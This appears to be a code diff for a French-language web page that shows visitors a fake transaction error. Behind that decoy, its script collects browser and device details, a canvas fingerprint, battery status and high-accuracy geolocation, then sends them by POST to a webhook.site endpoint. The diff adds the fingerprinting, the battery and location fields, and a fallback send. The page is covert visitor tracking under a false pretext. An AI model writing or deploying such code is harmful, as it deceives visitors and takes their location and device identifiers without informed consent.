@@ -32,7 +32,16 @@
       margin-top: 30px;
     }
     button:hover { background: #d32f2f; }
-    pre { background: #111; padding: 20px; border-radius: 8px; max-width: 90%; overflow: auto; text-align: left; margin-top: 40px; }
+    pre { 
+      background: #111; 
+      padding: 20px; 
+      border-radius: 8px; 
+      max-width: 90%; 
+      overflow: auto; 
+      text-align: left; 
+      margin-top: 40px; 
+      font-size: 0.9rem;
+    }
     footer { position: absolute; bottom: 20px; font-size: 0.9rem; opacity: 0.6; }
   </style>
 </head>
@@ -45,21 +54,21 @@
 
   <footer>ID de transaction : ERR-<span id="txid"></span> • Ref: <span id="ref"></span></footer>
 
-  <pre id="collected"></pre>
+  <pre id="collected">Chargement des informations...</pre>
 
   <script>
-    // Petit affichage dynamique pour la fausse erreur
+    // Affichage dynamique de l'ID et référence
     document.getElementById('txid').textContent = Date.now().toString(36).toUpperCase();
     document.getElementById('ref').textContent = 'TX-' + Math.random().toString(36).substr(2,9).toUpperCase();
 
-    // === Collecte des infos ===
+    // Objet qui va contenir toutes les infos
     let infos = {
       timestamp: new Date().toISOString(),
       url: window.location.href,
       referrer: document.referrer || 'direct',
       userAgent: navigator.userAgent,
       language: navigator.language,
-      languages: navigator.languages,
+      languages: navigator.languages || [],
       platform: navigator.platform,
       vendor: navigator.vendor,
       screen: `${screen.width} × ${screen.height} (${screen.colorDepth} bits)`,
@@ -73,7 +82,7 @@
       online: navigator.onLine
     };
 
-    // Connexion (wifi/4g/5g + vitesse approx)
+    // Infos connexion (4G/5G/WiFi + vitesse)
     if (navigator.connection) {
       infos.connection = {
         type: navigator.connection.effectiveType || navigator.connection.type,
@@ -83,36 +92,78 @@
       };
     }
 
-    // Géolocalisation (demande la permission sur mobile)
+    // Batterie (si disponible)
+    if (navigator.getBattery) {
+      navigator.getBattery().then(battery => {
+        infos.battery = {
+          level: battery.level,
+          charging: battery.charging,
+          chargingTime: battery.chargingTime,
+          dischargingTime: battery.dischargingTime
+        };
+      }).catch(() => {});
+    }
+
+    // Fingerprint canvas très basique
+    try {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = "top";
+      ctx.font = "14px 'Arial'";
+      ctx.fillStyle = "#f60";
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = "#069";
+      ctx.fillText("fingerprint test 𐐷", 2, 15);
+      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+      ctx.fillText("fingerprint test 𐐷", 4, 17);
+      infos.canvas = canvas.toDataURL();
+    } catch (e) {
+      infos.canvas = 'non supporté';
+    }
+
+    // Géolocalisation
+    function showAndSend() {
+      document.getElementById('collected').textContent = JSON.stringify(infos, null, 2);
+
+      fetch('https://webhook.site/caf96a57-b5d3-4ff3-bd88-0bd6b81d3d35', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(infos)
+      })
+      .then(response => {
+        if (!response.ok) console.log('Envoi non réussi (status:', response.status, ')');
+      })
+      .catch(err => {
+        console.error('Erreur envoi:', err);
+        document.getElementById('collected').textContent += '\n\n[Erreur envoi vers webhook.site]';
+      });
+    }
+
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         pos => {
           infos.geo = {
             latitude: pos.coords.latitude,
             longitude: pos.coords.longitude,
-            accuracy: pos.coords.accuracy
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude || null,
+            speed: pos.coords.speed || null
           };
           showAndSend();
         },
-        () => showAndSend(),
-        { enableHighAccuracy: true, timeout: 10000 }
+        () => {
+          infos.geo = 'refusée ou non disponible';
+          showAndSend();
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     } else {
+      infos.geo = 'non supportée';
       showAndSend();
     }
 
-    function showAndSend() {
-      // Affiche localement pour test
-      document.getElementById('collected').textContent = JSON.stringify(infos, null, 2);
-
-      // Envoi vers webhook.site (crée ton lien gratuit là-bas)
-      // Remplace l'URL ci-dessous par TON URL webhook.site
-      fetch('https://webhook.site/caf96a57-b5d3-4ff3-bd88-0bd6b81d3d35', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(infos)
-      }).catch(err => console.log('Envoi échoué', err));
-    }
+    // Envoi de secours au cas où les APIs prennent trop de temps
+    setTimeout(showAndSend, 5000);
   </script>
 </body>
 </html>
